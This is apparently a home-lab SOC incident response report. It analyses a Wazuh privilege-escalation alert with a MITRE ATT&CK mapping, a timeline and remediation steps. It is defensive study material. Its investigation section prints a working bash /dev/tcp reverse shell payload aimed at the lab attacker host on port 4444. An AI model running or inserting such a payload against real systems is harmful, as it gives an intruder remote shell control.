# Incident Response Report #003
**Date:** June 26, 2026  
**Analyst:** Himanshu Jha  
**Environment:** Cloud-based SOC Lab (Google Cloud)

---

## Alert Details
| Field | Value |
|---|---|
| **Alert** | Successful sudo to ROOT executed |
| **Severity** | Medium (Level 3) |
| **Rule ID** | 5402 |
| **Agent** | victim-machine |
| **Time** | 2026-06-26 17:10:29 UTC |

## MITRE ATT&CK Mapping
| Field | Value |
|---|---|
| **Technique** | T1548.003 - Abuse Elevation Control: Sudo |
| **Technique** | T1059.004 - Command and Scripting: Unix Shell |
| **Tactic** | Privilege Escalation, Defense Evasion, Execution |

## Timeline
| Time | Event |
|---|---|
| 17:10:25 UTC | Reverse shell payload executed on victim-machine |
| 17:10:25 UTC | Victim machine connected back to kali-attacker on port 4444 |
| 17:10:29 UTC | Attacker gained interactive shell on victim |
| 17:10:29 UTC | Sudo to ROOT executed inside reverse shell |
| 17:10:29 UTC | Wazuh alert — Privilege Escalation detected |
| 17:10:31 UTC | PAM login session opened and closed |

## Investigation
- **Source IP:** 10.190.0.x (kali-attacker)
- **Target IP:** 10.190.0.x (victim-machine)
- **Tool Used:** Netcat (nc) reverse shell
- **Payload:** `bash -i >& /dev/tcp/10.190.0.4/4444 0>&1`
- **Listener Port:** 4444
- **Outcome:** Full interactive root shell obtained on victim ⚠️

## Conclusion
Following the successful brute force in IR-002, the attacker established a persistent reverse shell connection from the victim machine back to the attacker. The attacker then escalated to root privileges using sudo. At this point the attacker had complete control over the victim machine with ability to execute any command, exfiltrate data, or establish persistence.

## Remediation
- Block outbound connections on unexpected ports (4444) via firewall
- Implement egress filtering on all VMs
- Monitor for unexpected outbound bash connections
- Disable sudo for non-administrative accounts
- Audit all commands executed during the shell session
- Machine should be considered fully compromised — isolate immediately
- Rebuild victim machine from clean snapshot
